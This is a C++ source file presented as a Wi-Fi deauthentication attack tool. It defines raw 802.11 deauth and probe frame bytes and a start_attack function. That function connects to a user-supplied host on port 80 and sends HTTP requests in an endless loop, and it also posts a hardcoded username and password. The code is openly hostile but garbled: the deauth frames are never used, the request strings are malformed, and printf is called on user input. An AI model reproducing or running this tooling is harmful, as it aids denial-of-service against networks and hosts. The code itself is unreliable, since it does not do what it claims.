#include "deaunth_attack.h"

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma warning(disable:4996)

#include <WinSock2.h>
#include <WS2tcpip.h>
#include <iostream>
#include <string>
#include <conio.h>
#include <stdint.h>
#include <stdio.h>

#include "die_socket.h"
#include "net_pcap.h"


#define DEAUTH_REQ                                                             \
	"\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define PCAP_ERRBUF_SIZE 256
#define kill 0xc0


char h80211[kill];

int count = 0;
SOCKET sock_s;

struct sockaddr_in my_addr;
struct sockaddr_in encoder_addr;

uint8_t deauthPacket[26] = {
	/*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
	/*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
	/*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
	/* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
	/* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
	/* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
	/* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
};

uint8_t probePacket[68] = {
	/*  0 - 1  */ 0x40, 0x00,                                       // Type: Probe Request
	/*  2 - 3  */ 0x00, 0x00,                                       // Duration: 0 microseconds
	/*  4 - 9  */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
	/* 10 - 15 */ 0xAA, 0xAA,               0xAA, 0xAA, 0xAA, 0xAA, // Source: random MAC
	/* 16 - 21 */ 0xff, 0xff,               0xff, 0xff, 0xff, 0xff, // BSS Id: Broadcast
	/* 22 - 23 */ 0x00, 0x00,                                       // Sequence number (will be replaced by the SDK)
	/* 24 - 25 */ 0x00, 0x20,                                       // Tag: Set SSID length, Tag length: 32
	/* 26 - 57 */ 0x20, 0x20,               0x20, 0x20,             // SSID
	0x20,               0x20,               0x20, 0x20,
	0x20,               0x20,               0x20, 0x20,
	0x20,               0x20,               0x20, 0x20,
	0x20,               0x20,               0x20, 0x20,
	0x20,               0x20,               0x20, 0x20,
	0x20,               0x20,               0x20, 0x20,
	0x20,               0x20,               0x20, 0x20,
	/* 58 - 59 */ 0x01, 0x04, // Tag Number: Supported Rates (1), Tag length: 4
	/* 60 */ 0x82,            // 1(B)
	/* 61 */ 0x84,            // 2(B)
	/* 62 */ 0x8b,            // 5.5(B)
	/* 63 */ 0x96,            // 11(B)
	/* 64 */ 0x24,            // 18
	/* 65 */ 0x30,            // 24
	/* 66 */ 0x48,            // 36
	/* 67 */ 0x6c             // 54
};


struct iphdr {

	unsigned char ihl : 4;
	unsigned char ver : 4;
	unsigned char tos;
	unsigned short totlen;
	unsigned short id;
	unsigned short frag_and_flags;
	unsigned char ttl;
	unsigned char proto;
	unsigned short checksum;
	unsigned int src;
	unsigned int dst;

};

struct tcphdr {

	unsigned short sport;
	unsigned short dport;
	unsigned int seq;
	unsigned int acknum;
	unsigned char unused : 4;
	unsigned char tcphl : 4;
	unsigned char Flags;
	unsigned short Windows;
	unsigned short cksum;
	unsigned short UrgPointer;
};

void start_attack(SOCKET sock) {

	struct in_addr srcip = { 0 };

	char adrserv[INET_ADDRSTRLEN];
	WSAData data;
	WORD versions = MAKEWORD(2, 2);
	int res = WSAStartup(versions, &data);
	if (res != 0) {

		printf("Socket()error!");
		exit(-1);
	}

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0) {

		printf("Socket()error\n");

		std::cin.get();
		die_socket();

		exit(-1);
	}

	printf("Inputed ip: ");
	std::cin >> adrserv;
	std::cout << adrserv << std::endl;


	struct sockaddr_in connect_c;

	connect_c.sin_family = AF_INET;
	connect_c.sin_port = htons(80);

	HOSTENT *hst;

	if (inet_addr(adrserv) != INADDR_NONE)
		connect_c.sin_addr.s_addr = inet_addr(adrserv);

	else {

		if (hst = gethostbyname(adrserv))
			((unsigned long *)&connect_c.sin_addr)[0] =
			((unsigned long **)hst->h_addr_list)[0][0];

		else {

			printf("Invalid address: %s\n", adrserv);
			closesocket(sock);
			WSACleanup();

			std::cin.get();
			exit(-1);

		}
	}

	if (connect(sock, (sockaddr *)&connect_c, sizeof(connect_c))) {

		printf("Connect()error");

		std::cin.get();
		exit(-1);

	}

	printf("Connect is OK{}\n");

	std::string pkt = "GET /ip HTTP/1.1\r\nHost: 192.168.0.1\r\nConnection: closer\n\r\n";
	std::string server = adrserv;
	int serv = atoi(adrserv);

	std::string input = "POST /http://www.cplusplus.com/user/ (user name=DezzenFlo&password=45ll88ll55)";
	send(sock, input.c_str(), strlen(input.c_str()), 0);

	while (true) {

		send(sock, pkt.c_str(), strlen(pkt.c_str()), 0);
		printf("][ Sending Packet ]["); printf(adrserv); printf(" ]\n");

		Sleep(1000);
	}
}